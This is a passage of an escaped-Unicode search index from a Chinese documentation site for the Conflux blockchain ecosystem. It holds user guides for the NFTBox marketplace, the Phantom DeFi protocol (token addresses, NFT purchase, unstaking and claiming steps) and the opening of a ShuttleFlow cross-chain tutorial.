NFTBox\u5c06\u79c9\u627f\u7740\u7528\u6237\u4f53\u9a8c\u4e3a\u6700\u4f18\u5148\u7ea7\uff0c\u652f\u6301\u624b\u673a\u7aef\u3001PC\u7aef\u7b49\u591a\u79cd\u7ec8\u7aef\u4ea7\u54c1\uff0c\u505a\u4e00\u5bb6\u9ad8\u6548\u3001\u521b\u65b0\u3001\u6709\u4ef7\u503c\u3001\u7528\u6237\u53cb\u597d\u7684NFT\u4ea4\u4e92\u5e73\u53f0\u3002","title":"\u751f\u6001\u4ecb\u7ecd"},{"location":"ecosystem/nft-box/#_2","text":"NFTBox \u4e3b\u9875","title":"\u751f\u6001\u94fe\u63a5"},{"location":"ecosystem/nft-box/#_3","text":"\u751f\u6001\u4e3b\u9875\u9875\u9762\u5982\u4e0b\u6240\u793a\uff0c\u4e3b\u8981\u5305\u62ec\uff1a \u4e3b\u9875\uff1a\u5e73\u53f0\u63a8\u8350\u7684NFT\u8d44\u4ea7\u5c55\u793a\u4e0e\u8054\u64ad \u53d1\u73b0\uff1a\u901a\u8fc7\u641c\u7d22\u63a5\u53e3\u53d1\u73b0\u827a\u672f\u54c1\u548c\u827a\u672f\u5bb6 \u5546\u57ce\uff1a\u5305\u542b\u5f53\u524d\u6b63\u5728\u62cd\u5356\u6216\u4e00\u53e3\u4ef7\u552e\u5356\u7684NFT\u8d44\u4ea7 \u6d3b\u52a8\uff1a\u76f2\u76d2\u8d2d\u4e70\uff0c\u5c71\u6d77\u7ecf\u6e38\u620f\uff0c\u98de\u82b1\u4ee4NFT\u94f8\u9020\u6d3b\u52a8\u7b49 \u753b\u5eca\uff1a\u656c\u8bf7\u671f\u5f85 \u521b\u4f5c\uff1a\u652f\u6301\u7528\u6237\u6216\u827a\u672f\u5bb6\u81ea\u884c\u4e0a\u4f20\u56fe\u7247\u5e76\u94f8\u9020NFT \u6536\u85cf\uff1a\u5f53\u8fde\u63a5\u94b1\u5305\u540e\uff0c\u53ef\u4ee5\u67e5\u770b\u94b1\u5305\u5185\u4e2d\u7684NFT\uff0c\u7b7e\u5230\u83b7\u5f97\u8865\u5929\u77f3","title":"\u751f\u6001\u529f\u80fd\u4ecb\u7ecd"},{"location":"ecosystem/nft-box/#nft","text":"\u5728NFTBox\u7684 \u6d3b\u52a8\u9875\u9762 \u53ef\u4ee5\u8d2d\u4e70NFT \u70b9\u51fb\u8fdb\u5165\u6309\u94ae\u540e\uff0c\u53ef\u4ee5\u5728\u9875\u9762\u4e2d\u67e5\u770b\u5230\u5df2\u53d1\u552e\u6216\u5f85\u53d1\u552e\u7684NFT\u54c1\u7c7b \u4e0b\u62c9\u9875\u9762\uff0c\u53ef\u770b\u5230\u8d2d\u4e70\u5361\u5305\u6309\u94ae \u5728\u76f2\u76d2\u6709\u5269\u4f59\u7684\u65f6\u5019\uff0c\u53ef\u4ee5\u70b9\u51fb\u201c\u8d2d\u4e70\u5361\u5305\u201d\u6309\u94ae\uff0c\u652f\u4ed8token\u5e76\u8d2d\u4e70\u76f2\u76d2","title":"\u5728\u54ea\u8d2d\u4e70NFT"},{"location":"ecosystem/nft-box/#_4","text":"\u4f7f\u7528\u914d\u7f6e\u4e86Conflux Portal\u94b1\u5305\u7684\u6d4f\u89c8\u5668\u8bbf\u95ee NFTBox \u6536\u85cf\u9875 \uff0c\u7cfb\u7edf\u81ea\u52a8\u547c\u51faConflux Portal\u94b1\u5305\u8fde\u63a5\u9875\u9762 Note \u9700\u8981\u914d\u7f6eConflux Portal\u94b1\u5305\uff0c\u914d\u7f6e\u6559\u7a0b\u89c1 Portal \u5b89\u88c5\u914d\u7f6e\u6b65\u9aa4 \u9009\u62e9\u9700\u8981\u8fde\u63a5\u7684Conflux\u94b1\u5305\u8d26\u6237 \u8fde\u63a5\u540e\uff0c\u70b9\u51fb\u9875\u9762\u4e2d\u7b7e\u5230\u6309\u94ae \u81ea\u52a8\u547c\u51faConflux Portal\u7684\u5408\u7ea6\u4ea4\u4e92\u64cd\u4f5c\u63a5\u53e3\uff0c\u70b9\u51fb\u786e\u8ba4\u5373\u53ef\u7b7e\u5230\u83b7\u5f975\u4e2a\u8865\u5929\u77f3 Note \u5728\u7b7e\u5230\u5408\u7ea6\u4ee3\u4ed8\u989d\u5ea6\u4e0d\u8db3\u65f6\uff1a\u9700\u8981\u652f\u4ed8\u71c3\u6c14\u8d39+\u5b58\u50a8\u8d39\u624d\u80fd\u7b7e\u5230\u6210\u529f\uff0c\u5efa\u8bae\u5728\u5408\u7ea6\u4ee3\u4ed8\u6709\u989d\u5ea6\u7684\u65f6\u5019\u8fdb\u884c\u7b7e\u5230\u64cd\u4f5c\uff08\u56e0\u5408\u7ea6\u4ee3\u4ed8\u800c\u4e0d\u6d88\u8017\u4efb\u4f55cfx\uff09\u3002","title":"\u8865\u5929\u77f3\u7b7e\u5230\u6559\u7a0b"},{"location":"ecosystem/nft-box/#nftbox_1","text":"\u5728\u6301\u6709NFTBox\u5934\u50cfNFT\u7684\u60c5\u51b5\u4e0b\uff0c\u53ef\u4ee5\u5c06\u81ea\u5df1\u7684\u4e2a\u6027\u5316\u5934\u50cf\u53d8\u66f4\u4e3a\u60a8\u6301\u6709\u7684NFT\u6837\u5f0f\uff0c\u76ee\u524d\u5df2\u652f\u6301pixel\u70e4\u4ed4\u5934\u50cf\u3002 Pixel\u70e4\u4ed4\u6d3b\u52a8\u4ecb\u7ecd \u8bbf\u95ee NFTBox\u6536\u85cf\u9875\u9762 \uff0c\u8fde\u63a5\u94b1\u5305\u540e\u70b9\u51fb\u5934\u50cf\u53f3\u4e0b\u89d2\u6309\u94ae \u6311\u9009\u5934\u50cf \u70b9\u51fb\u559c\u6b22\u7684\u5934\u50cf\uff1a\u7531\u4e8e\u7b14\u8005\u53ea\u6709\u4e00\u4e2a\u5934\u50cfNFT\uff0c\u53ea\u80fd\u9009\u4ed6 \u70b9\u51fb\u786e\u5b9a\u6309\u94ae\uff0c\u4f1a\u547c\u51faPortal\u8fdb\u884c\u7b7e\u540d\uff0c\u70b9\u51fb\u7b7e\u540d\u5373\u53ef \u5934\u50cf\u53d8\u4e3aPunk","title":"\u66f4\u6362NFTBox\u5934\u50cf"},{"location":"ecosystem/nft-box/#nftbox_2","text":"\u5728\u6301\u6709\u8bcdNFT\u7684\u60c5\u51b5\u4e0b\uff0c\u53ef\u4ee5\u5c06\u4e2a\u6027\u5316\u79f0\u8c13\u53d8\u66f4\u4e3a\u60a8\u6301\u6709\u8bcdNFT\u6240\u5bf9\u5e94\u7684\u5185\u5bb9 \u8bbf\u95ee NFTBox\u6536\u85cf\u9875\u9762 \uff0c\u8fde\u63a5\u94b1\u5305\u540e\u70b9\u51fb\u5934\u50cf\u4e0b\u65b9\u6635\u79f0\u53f3\u4fa7\u7684\u94c5\u7b14\u56fe\u6807 \u5728\u65b0\u51fa\u73b0\u7684\u9875\u9762\u53ef\u67e5\u770b\u4f60\u6301\u6709\u7684\u8bcdNFT\u6837\u5f0f \u9009\u4e2dNFT\uff0c\u5e76\u70b9\u51fb\u786e\u8ba4 \u901a\u8fc7Portal\u7b7e\u540d\u4ea4\u6613\u5373\u53ef\u66f4\u6362\u79f0\u8c13\u4e3a\u201c\u5355\u8584\u201d","title":"\u66f4\u6362NFTBox\u79f0\u8c13"},{"location":"ecosystem/nft-box/#nftbox_3","text":"\u7528\u6237\u53ef\u6309\u7167\u81ea\u5df1\u7684\u559c\u597d\uff0c\u8c03\u6574\u5176\u5728NFTBox\u5e73\u53f0\u7684\u6635\u79f0 \u8bbf\u95ee NFTBox\u6536\u85cf\u9875\u9762 \uff0c\u8fde\u63a5\u94b1\u5305\u540e\u70b9\u51fb\u5934\u50cf\u4e0b\u65b9\u6635\u79f0\u53f3\u4fa7\u7684\u94c5\u7b14\u56fe\u6807 \u5728\u5f39\u51fa\u9875\u9762\u4e2d\u8f93\u5165\u7528\u6237\u5e0c\u671b\u8bbe\u7f6e\u7684\u6635\u79f0 \u7b7e\u540d\u4ea4\u6613 \u4fee\u6539\u6635\u79f0\u6210\u529f","title":"\u66f4\u6362NFTBox\u6635\u79f0"},{"location":"ecosystem/phantom/","text":"Phantom\u534f\u8bae \u00b6 \u751f\u6001\u4ecb\u7ecd \u00b6 Phantom\u662f\u4e00\u4e2a\u8de8\u94feDeFi\u534f\u8bae\uff0c\u7528\u4e8e\u521b\u5efa\u5408\u6210\u8d44\u4ea7\u5e76\u6316\u77ff\uff0c\u751a\u81f3\u652f\u6301\u53d1\u884cNFT\u3002Phantom\u7528\u6237\u53ef\u4ee5\u4f7f\u7528\u52a0\u5bc6\u8d27\u5e01\u3001NFT\u548c\u5176\u4ed6\u6570\u5b57\u8d44\u4ea7\u4f5c\u4e3a\u62b5\u62bc\u54c1\u6765\u521b\u5efa\u5408\u6210\u8d44\u4ea7\u3002\u901a\u8fc7\u8fd9\u4e00\u65b9\u6cd5\uff0cPhantom\u6253\u7834\u4e86\u6570\u5b57\u8d27\u5e01\u8d44\u4ea7\u548c\u4f20\u7edf\u4ea4\u6613\u8d44\u4ea7\u4e4b\u95f4\u7684\u969c\u788d\uff0c\u6709\u6548\u964d\u4f4e\u4e86\u666e\u901a\u4eba\u53c2\u4e0e\u591a\u5143\u5316\u6295\u8d44\u7c7b\u522b\u7684\u95e8\u69db\u3002 \u751f\u6001\u94fe\u63a5 \u00b6 Phantom Home page Phantom\u82f1\u6587\u7248\u4ecb\u7ecd\u6587\u6863 Phantom\u4ee3\u7801\u5ba1\u8ba1\u62a5\u544a \u751f\u6001\u9875\u9762\u5982\u4e0b\u6240\u793a\uff1a\u4e3b\u8981\u5305\u542b\u4e86\u751f\u6001TVL\uff0c\u5408\u6210\u8d44\u4ea7pAssets\u7684\u5e02\u503c\uff0c\u6d41\u52a8\u6027\u7edf\u8ba1 \u6dfb\u52a0PHMP\u79ef\u5206\u5230Conflux Portal \u00b6 PHMP\u79ef\u5206\u53ef\u4ee5\u53c2\u4e0e Phantom\u521b\u4e16NFT \u7684\u8d2d\u4e70 \u60a8\u53ef\u4ee5\u53c2\u8003 \u6dfb\u52a0 CRC20 \u4ee3\u5e01\u5230 Portal \u7684\u65b9\u6cd5\u4e0e\u6b65\u9aa4-\u6cd5 2\uff1a\u5408\u7ea6\u5730\u5740\u81ea\u5b9a\u4e49\u6dfb\u52a0\u4ee3\u5e01 \u6dfb\u52a0PHMP\u4ee3\u5e01\u81f3Portal\uff0cPHMP\u4ee3\u5e01\u7684\u5408\u7ea6\u5730\u5740\u4e3a\uff1a cfx:ach4t6n6s0zm45049b7 jr19c48pws7a5x2gxafb10w\u3002 \u6dfb\u52a0PHMP\u5230Portal\u540e\u7684\u663e\u793a\u6548\u679c\u5982\u4e0b\uff1a \u4f7f\u7528PHMP\u79ef\u5206\u8d2d\u4e70Phantom\u521b\u4e16NFT \u00b6 \u8bbf\u95ee\u521b\u4e16NFT \u8d2d\u4e70\u7f51\u7ad9 Note \u9700\u8981\u8bf4\u660e\u7684\u662f\uff1a\u6b64\u6b21\u5171\u53d1\u884c100\u4e2aNFT\uff0c\u6bcf\u4e2aNFT\u53ef\u4ee5\u4f7f\u7528200\u4e2aPHMP\u8fdb\u884c\u62a2\u8d2d \u70b9\u51fb\u9875\u9762Approve\u6309\u94ae\uff0c\u6388\u6743\u5408\u7ea6\u80fd\u591f\u4f7f\u7528\u60a8\u94b1\u5305\u5730\u5740\u4e2d\u7684PHMP \u7531\u4e8e\u5408\u7ea6\u672a\u4ee3\u4ed8\uff0c\u9700\u8981\u652f\u4ed80.0625cfx\u7684\u8d39\u7528\u624d\u80fd\u591f\u53d1\u9001\u6388\u6743\u4ea4\u6613 \u7b49\u5f85\u5012\u8ba1\u65f6\u7ed3\u675f\uff0c\u9009\u62e9\u8d2d\u4e70\u6570\u91cf\u5e76\u70b9\u51fbSubmit\u6309\u94ae \u5728\u5f39\u51fa\u7684Portal\u7a97\u53e3\u4e2d\u70b9\u51fb\u786e\u8ba4\u4e0e\u5408\u7ea6\u8fdb\u884c\u4ea4\u4e92 Note \u62a2\u8d2d\u6d3b\u52a8\u65f6\u95f4\u5728\u5317\u4eac\u65f6\u95f48\u670817\u65e5\u4e2d\u534812\u70b914\u5206\u5df2\u7ed3\u675f\uff0c\u8be6\u60c5\u53ef\u89c1 PHM NFT\u4e3b\u9875\u4e2d\u7684\u5012\u8ba1\u65f6\u6a21\u5757 \u3002\u5df2\u62a2\u5230\u7684\u7528\u6237\u8bb0\u5f97\u6309\u7167\u5982\u4e0b\u6b65\u9aa4\u5f00\u542fNFT\u76f2\u76d2 \u8bbf\u95ee\u521b\u4e16NFT \u8d2d\u4e70\u7f51\u7ad9 \uff0c\u70b9\u51fb My Packs\u6309\u94ae\u540e\u70b9\u51fb\u8981\u6253\u5f00\u7684\u76f2\u76d2\uff0c\u6b64\u65f6\u4f1a\u547c\u51faConflux Portal\u4ee5\u8fdb\u884c\u5408\u7ea6\u4ea4\u4e92\uff0c\u70b9\u51fb\u786e\u8ba4\u5373\u53ef\u3002 \u4ea4\u6613\u7ed3\u675f\u540e\u70b9\u51fbMy NFTs\u6309\u94ae\u53ef\u67e5\u770b\u5f00\u51fa\u7684NFT \u6211\u4e0d\u60f3\u6316\u77ff\u4e86\uff0c\u628a\u94b1\u8fd8\u6211\uff01 \u00b6 1\u3001\u5e7b\u5f71\u90a3\u8fb9\u89e3\u9664\u8d28\u62bc\uff0c\u5c31\u662f\u5728Farm\u90a3\u680f\u91cc\u9762\uff0cUnstake\u3002\u8fd9\u4e2a\u65f6\u5019LPtoken\u5c31\u91ca\u653e\u51fa\u6765\u4e86\u3002 2\u3001\u53bbMoonswap\u628aLPtoken\u4ece\u6c60\u5b50\u91cc\u9762\u89e3\u9664\u6389\u3002\u5c31\u91ca\u653e\u51fa\u6765cfx\u8ddfpcfx\u3002 3\u3001\u68c0\u67e5LP\u91ca\u653e\u51fa\u6765\u7684Pcfx\u6570\u91cf\uff0c\u662f\u4e0d\u662f\u8ddf\u4f60phm\u91cc\u9762\u5408\u6210\u7684\u6570\u91cf\u4e00\u6837\u3002\u591a\u4e8e\u5408\u6210\u6570\u91cf\u5c31\u53ef\u4ee5\uff0c\u6570\u91cf\u4e0d\u591f\u7684\uff0c\u53bbmoonswap\u91cc\u9762\u6362\u3002Pcfx\u53bb\u5e7b\u5f71\u91cc\u9762build\u91cc\u9762Close\u3002 4\u3001\u5982\u679c\u5269\u4e0b\u4e86pcfx\uff0c\u5c31\u53bbmoonswap\u5356\u4e86\uff0c\u6ca1\u6709\u5269\u4e0b\uff0c\u5c31\u7b2c3\u6b65\u5b8c\u4e86\u4ee5\u540e\u5c31\u7ed3\u675f\u4e86\u3002 \u8bbf\u95ee farm \u9875\u9762\uff0c\u9009\u53d6\u9700\u8981\u79fb\u9664\u7684\u6316\u77ffLP\u5bf9\uff08\u4ee5moon\u4e3a\u4f8b\uff09 \u70b9\u51fbmoon-pmoon\u8fdb\u5165\u9875\u9762\uff0c\u5207\u6362\u81f3Unstake\u9009\u9879\u5361\uff0c\u8f93\u5165\u9700\u8981\u79fb\u9664\u7684LP\u5bf9\u6570\u91cf\uff0c\u6b64\u5904\u4e3a233.611 \u70b9\u51fbunstake\u6309\u94ae\uff0c\u786e\u8ba4\u4ea4\u6613 \u4ea4\u6613\u786e\u8ba4\u540e\uff0c\u9875\u9762\u63d0\u793a\u6210\u529f \u8bbf\u95ee moonswap\u8d44\u91d1\u6c60 \u89e3\u9664moon-pmoon\u6d41\u52a8\u6027 \u9009\u62e9100%\uff0c\u70b9\u51fb\u6388\u6743\uff0c\u6388\u6743moonswap\u64cd\u4f5cMLP \u79fb\u9664MLP\uff0c\u83b7\u5f97cmoon\u548cpmoon\u4ee3\u5e01 \u8bbf\u95eephantom\u7684 my\u9875\u9762 \uff0c\u53d1\u73b0\u5f53\u524d\u6211\u4eec\u7684pmoon\u4e2a\u6570\u80fd\u591fclose\u90e8\u5206\u5408\u6210\u8fc7\u7684\u8d44\u4ea7\uff0c\u8fdb\u800c\u83b7\u5f97cmoon \u4ee5close id\u4e3a131\u7684\u5408\u6210\u8d44\u4ea7\u4e3a\u4f8b\uff0c\u5173\u95ed\u4ed6\uff0c\u9700\u8981\u6d88\u801775\u4e2apmoon \u70b9\u51fbclose\u6309\u94ae\uff0c\u786e\u8ba4\u4ea4\u6613 \u901a\u8fc7scan\u53ef\u4ee5\u53d1\u73b0\u8fd9\u7b14\u4ea4\u6613\uff0cphantom\u6536\u53d6\u4e861%\u7684\u624b\u7eed\u8d39\uff0c\u9500\u6bc1\u4e8675\u4e2apmoon\uff0c\u5e76\u8fd4\u56de\u7ed9\u7528\u6237148.5\u4e2acmoon \u63d0\u53d6PHM\u4ee3\u5e01 \u00b6 \u8bbf\u95ee Phantom My info \u9875\u9762 \uff0c\u4e0b\u62c9\u81f3Farm\u6a21\u5757\uff0c\u53ef\u4ee5\u67e5\u770b\u5c1a\u672a\u63d0\u53d6\u7684PHM\u4ee3\u5e01 \u70b9\u51fb\u9ec4\u8272\u4e09\u70b9\u6309\u94ae\uff0c\u5e76\u70b9\u51fbClaim \u70b9\u51fbClaim\u540e\uff0c\u5c06\u8df3\u8f6c\u81f3\u65b0\u9875\u9762 \u70b9\u51fb\u201cCLAIM\u201d\u6309\u94ae\uff0c\u5e76\u786e\u8ba4\u8fd9\u7b14\u5408\u7ea6\u4ea4\u6613\u5373\u53ef \u5728Conflux Portal\u4e2d\u6dfb\u52a0PHM\u4ee3\u5e01 \u00b6 \u5408\u7ea6\u5730\u5740\uff1acfx:acdyvs4fzn1rfnh6mcyt 2rxpawany5cng6gdpx3psa \u53c2\u8003 \u6dfb\u52a0 CRC20 \u4ee3\u5e01\u5230 Portal \u7684\u65b9\u6cd5\u4e0e\u6b65\u9aa4 \uff1a\u53ef\u6dfb\u52a0cPHM\u4ee3\u5e01\u5230Portal\uff0c \u793e\u533a\u6210\u5458\u5bf9Phantom\u7684\u8ba8\u8bba \u00b6 Phantom\u73a9\u6cd5\u8ba8\u8bba\uff0c\u5171\u540c\u5b66\u4e60","title":"Phantom\u534f\u8bae"},{"location":"ecosystem/phantom/#phantom","text":"","title":"Phantom\u534f\u8bae"},{"location":"ecosystem/phantom/#_1","text":"Phantom\u662f\u4e00\u4e2a\u8de8\u94feDeFi\u534f\u8bae\uff0c\u7528\u4e8e\u521b\u5efa\u5408\u6210\u8d44\u4ea7\u5e76\u6316\u77ff\uff0c\u751a\u81f3\u652f\u6301\u53d1\u884cNFT\u3002Phantom\u7528\u6237\u53ef\u4ee5\u4f7f\u7528\u52a0\u5bc6\u8d27\u5e01\u3001NFT\u548c\u5176\u4ed6\u6570\u5b57\u8d44\u4ea7\u4f5c\u4e3a\u62b5\u62bc\u54c1\u6765\u521b\u5efa\u5408\u6210\u8d44\u4ea7\u3002\u901a\u8fc7\u8fd9\u4e00\u65b9\u6cd5\uff0cPhantom\u6253\u7834\u4e86\u6570\u5b57\u8d27\u5e01\u8d44\u4ea7\u548c\u4f20\u7edf\u4ea4\u6613\u8d44\u4ea7\u4e4b\u95f4\u7684\u969c\u788d\uff0c\u6709\u6548\u964d\u4f4e\u4e86\u666e\u901a\u4eba\u53c2\u4e0e\u591a\u5143\u5316\u6295\u8d44\u7c7b\u522b\u7684\u95e8\u69db\u3002","title":"\u751f\u6001\u4ecb\u7ecd"},{"location":"ecosystem/phantom/#_2","text":"Phantom Home page Phantom\u82f1\u6587\u7248\u4ecb\u7ecd\u6587\u6863 Phantom\u4ee3\u7801\u5ba1\u8ba1\u62a5\u544a \u751f\u6001\u9875\u9762\u5982\u4e0b\u6240\u793a\uff1a\u4e3b\u8981\u5305\u542b\u4e86\u751f\u6001TVL\uff0c\u5408\u6210\u8d44\u4ea7pAssets\u7684\u5e02\u503c\uff0c\u6d41\u52a8\u6027\u7edf\u8ba1","title":"\u751f\u6001\u94fe\u63a5"},{"location":"ecosystem/phantom/#phmpconflux-portal","text":"PHMP\u79ef\u5206\u53ef\u4ee5\u53c2\u4e0e Phantom\u521b\u4e16NFT \u7684\u8d2d\u4e70 \u60a8\u53ef\u4ee5\u53c2\u8003 \u6dfb\u52a0 CRC20 \u4ee3\u5e01\u5230 Portal \u7684\u65b9\u6cd5\u4e0e\u6b65\u9aa4-\u6cd5 2\uff1a\u5408\u7ea6\u5730\u5740\u81ea\u5b9a\u4e49\u6dfb\u52a0\u4ee3\u5e01 \u6dfb\u52a0PHMP\u4ee3\u5e01\u81f3Portal\uff0cPHMP\u4ee3\u5e01\u7684\u5408\u7ea6\u5730\u5740\u4e3a\uff1a cfx:ach4t6n6s0zm45049b7 jr19c48pws7a5x2gxafb10w\u3002 \u6dfb\u52a0PHMP\u5230Portal\u540e\u7684\u663e\u793a\u6548\u679c\u5982\u4e0b\uff1a","title":"\u6dfb\u52a0PHMP\u79ef\u5206\u5230Conflux Portal"},{"location":"ecosystem/phantom/#phmpphantomnft","text":"\u8bbf\u95ee\u521b\u4e16NFT \u8d2d\u4e70\u7f51\u7ad9 Note \u9700\u8981\u8bf4\u660e\u7684\u662f\uff1a\u6b64\u6b21\u5171\u53d1\u884c100\u4e2aNFT\uff0c\u6bcf\u4e2aNFT\u53ef\u4ee5\u4f7f\u7528200\u4e2aPHMP\u8fdb\u884c\u62a2\u8d2d \u70b9\u51fb\u9875\u9762Approve\u6309\u94ae\uff0c\u6388\u6743\u5408\u7ea6\u80fd\u591f\u4f7f\u7528\u60a8\u94b1\u5305\u5730\u5740\u4e2d\u7684PHMP \u7531\u4e8e\u5408\u7ea6\u672a\u4ee3\u4ed8\uff0c\u9700\u8981\u652f\u4ed80.0625cfx\u7684\u8d39\u7528\u624d\u80fd\u591f\u53d1\u9001\u6388\u6743\u4ea4\u6613 \u7b49\u5f85\u5012\u8ba1\u65f6\u7ed3\u675f\uff0c\u9009\u62e9\u8d2d\u4e70\u6570\u91cf\u5e76\u70b9\u51fbSubmit\u6309\u94ae \u5728\u5f39\u51fa\u7684Portal\u7a97\u53e3\u4e2d\u70b9\u51fb\u786e\u8ba4\u4e0e\u5408\u7ea6\u8fdb\u884c\u4ea4\u4e92 Note \u62a2\u8d2d\u6d3b\u52a8\u65f6\u95f4\u5728\u5317\u4eac\u65f6\u95f48\u670817\u65e5\u4e2d\u534812\u70b914\u5206\u5df2\u7ed3\u675f\uff0c\u8be6\u60c5\u53ef\u89c1 PHM NFT\u4e3b\u9875\u4e2d\u7684\u5012\u8ba1\u65f6\u6a21\u5757 \u3002\u5df2\u62a2\u5230\u7684\u7528\u6237\u8bb0\u5f97\u6309\u7167\u5982\u4e0b\u6b65\u9aa4\u5f00\u542fNFT\u76f2\u76d2 \u8bbf\u95ee\u521b\u4e16NFT \u8d2d\u4e70\u7f51\u7ad9 \uff0c\u70b9\u51fb My Packs\u6309\u94ae\u540e\u70b9\u51fb\u8981\u6253\u5f00\u7684\u76f2\u76d2\uff0c\u6b64\u65f6\u4f1a\u547c\u51faConflux Portal\u4ee5\u8fdb\u884c\u5408\u7ea6\u4ea4\u4e92\uff0c\u70b9\u51fb\u786e\u8ba4\u5373\u53ef\u3002 \u4ea4\u6613\u7ed3\u675f\u540e\u70b9\u51fbMy NFTs\u6309\u94ae\u53ef\u67e5\u770b\u5f00\u51fa\u7684NFT","title":"\u4f7f\u7528PHMP\u79ef\u5206\u8d2d\u4e70Phantom\u521b\u4e16NFT"},{"location":"ecosystem/phantom/#_3","text":"1\u3001\u5e7b\u5f71\u90a3\u8fb9\u89e3\u9664\u8d28\u62bc\uff0c\u5c31\u662f\u5728Farm\u90a3\u680f\u91cc\u9762\uff0cUnstake\u3002\u8fd9\u4e2a\u65f6\u5019LPtoken\u5c31\u91ca\u653e\u51fa\u6765\u4e86\u3002 2\u3001\u53bbMoonswap\u628aLPtoken\u4ece\u6c60\u5b50\u91cc\u9762\u89e3\u9664\u6389\u3002\u5c31\u91ca\u653e\u51fa\u6765cfx\u8ddfpcfx\u3002 3\u3001\u68c0\u67e5LP\u91ca\u653e\u51fa\u6765\u7684Pcfx\u6570\u91cf\uff0c\u662f\u4e0d\u662f\u8ddf\u4f60phm\u91cc\u9762\u5408\u6210\u7684\u6570\u91cf\u4e00\u6837\u3002\u591a\u4e8e\u5408\u6210\u6570\u91cf\u5c31\u53ef\u4ee5\uff0c\u6570\u91cf\u4e0d\u591f\u7684\uff0c\u53bbmoonswap\u91cc\u9762\u6362\u3002Pcfx\u53bb\u5e7b\u5f71\u91cc\u9762build\u91cc\u9762Close\u3002 4\u3001\u5982\u679c\u5269\u4e0b\u4e86pcfx\uff0c\u5c31\u53bbmoonswap\u5356\u4e86\uff0c\u6ca1\u6709\u5269\u4e0b\uff0c\u5c31\u7b2c3\u6b65\u5b8c\u4e86\u4ee5\u540e\u5c31\u7ed3\u675f\u4e86\u3002 \u8bbf\u95ee farm \u9875\u9762\uff0c\u9009\u53d6\u9700\u8981\u79fb\u9664\u7684\u6316\u77ffLP\u5bf9\uff08\u4ee5moon\u4e3a\u4f8b\uff09 \u70b9\u51fbmoon-pmoon\u8fdb\u5165\u9875\u9762\uff0c\u5207\u6362\u81f3Unstake\u9009\u9879\u5361\uff0c\u8f93\u5165\u9700\u8981\u79fb\u9664\u7684LP\u5bf9\u6570\u91cf\uff0c\u6b64\u5904\u4e3a233.611 \u70b9\u51fbunstake\u6309\u94ae\uff0c\u786e\u8ba4\u4ea4\u6613 \u4ea4\u6613\u786e\u8ba4\u540e\uff0c\u9875\u9762\u63d0\u793a\u6210\u529f \u8bbf\u95ee moonswap\u8d44\u91d1\u6c60 \u89e3\u9664moon-pmoon\u6d41\u52a8\u6027 \u9009\u62e9100%\uff0c\u70b9\u51fb\u6388\u6743\uff0c\u6388\u6743moonswap\u64cd\u4f5cMLP \u79fb\u9664MLP\uff0c\u83b7\u5f97cmoon\u548cpmoon\u4ee3\u5e01 \u8bbf\u95eephantom\u7684 my\u9875\u9762 \uff0c\u53d1\u73b0\u5f53\u524d\u6211\u4eec\u7684pmoon\u4e2a\u6570\u80fd\u591fclose\u90e8\u5206\u5408\u6210\u8fc7\u7684\u8d44\u4ea7\uff0c\u8fdb\u800c\u83b7\u5f97cmoon \u4ee5close id\u4e3a131\u7684\u5408\u6210\u8d44\u4ea7\u4e3a\u4f8b\uff0c\u5173\u95ed\u4ed6\uff0c\u9700\u8981\u6d88\u801775\u4e2apmoon \u70b9\u51fbclose\u6309\u94ae\uff0c\u786e\u8ba4\u4ea4\u6613 \u901a\u8fc7scan\u53ef\u4ee5\u53d1\u73b0\u8fd9\u7b14\u4ea4\u6613\uff0cphantom\u6536\u53d6\u4e861%\u7684\u624b\u7eed\u8d39\uff0c\u9500\u6bc1\u4e8675\u4e2apmoon\uff0c\u5e76\u8fd4\u56de\u7ed9\u7528\u6237148.5\u4e2acmoon","title":"\u6211\u4e0d\u60f3\u6316\u77ff\u4e86\uff0c\u628a\u94b1\u8fd8\u6211\uff01"},{"location":"ecosystem/phantom/#phm","text":"\u8bbf\u95ee Phantom My info \u9875\u9762 \uff0c\u4e0b\u62c9\u81f3Farm\u6a21\u5757\uff0c\u53ef\u4ee5\u67e5\u770b\u5c1a\u672a\u63d0\u53d6\u7684PHM\u4ee3\u5e01 \u70b9\u51fb\u9ec4\u8272\u4e09\u70b9\u6309\u94ae\uff0c\u5e76\u70b9\u51fbClaim \u70b9\u51fbClaim\u540e\uff0c\u5c06\u8df3\u8f6c\u81f3\u65b0\u9875\u9762 \u70b9\u51fb\u201cCLAIM\u201d\u6309\u94ae\uff0c\u5e76\u786e\u8ba4\u8fd9\u7b14\u5408\u7ea6\u4ea4\u6613\u5373\u53ef","title":"\u63d0\u53d6PHM\u4ee3\u5e01"},{"location":"ecosystem/phantom/#conflux-portalphm","text":"\u5408\u7ea6\u5730\u5740\uff1acfx:acdyvs4fzn1rfnh6mcyt 2rxpawany5cng6gdpx3psa \u53c2\u8003 \u6dfb\u52a0 CRC20 \u4ee3\u5e01\u5230 Portal \u7684\u65b9\u6cd5\u4e0e\u6b65\u9aa4 \uff1a\u53ef\u6dfb\u52a0cPHM\u4ee3\u5e01\u5230Portal\uff0c","title":"\u5728Conflux Portal\u4e2d\u6dfb\u52a0PHM\u4ee3\u5e01"},{"location":"ecosystem/phantom/#phantom_1","text":"Phantom\u73a9\u6cd5\u8ba8\u8bba\uff0c\u5171\u540c\u5b66\u4e60","title":"\u793e\u533a\u6210\u5458\u5bf9Phantom\u7684\u8ba8\u8bba"},{"location":"ecosystem/shuttleflow/","text":"Shuttleflow\u8de8\u94fe\u5de5\u5177 \u00b6 ShuttleFlow \u901a\u8fc7 Conflux \u94fe\u4f5c\u4e3a\u4e2d\u7ee7\u6865\u6881\uff0c\u53ef\u4ee5\u5feb\u901f\u5b8c\u6210\u591a\u94fe\u4e4b\u95f4\u7684\u7075\u6d3b\u8de8\u94fe\u3002 ShuttleFlow \u5730\u5740\uff1a shuttleflow.io ShuttleFlow\u767d\u76ae\u4e66\uff1a white paper \u63a5\u4e0b\u6765\u4ecb\u7ecd\u4e00\u4e0b\u5982\u4f55\u4f7f\u7528 ShuttleFlow \u8fdb\u884c\u8de8\u94fe\uff0c\u4ee5 ETH \u8de8\u5165\u81f3 Conflux \u4e3a\u4f8b ShuttleflowV1.3\u8de8\u94fe\u6559\u7a0b\uff08\u4ee5ETH\u4e3a\u4f8b\uff09 \u00b6 1\uff09\u8fde\u63a5\u94b1\u5305 \u00b6 \u70b9\u51fb\u4e0a\u65b9\u201cConnect Wallet\u201d\uff0c\u8fde\u63a5 ConfluxPortal \u94b1\u5305\u548c MetaMask \u94b1\u5305\u3002 2\uff09\u9009\u62e9\u8de8\u94fe\u5bf9 \u00b6 \u8fdb\u5165 ShuttleFlow 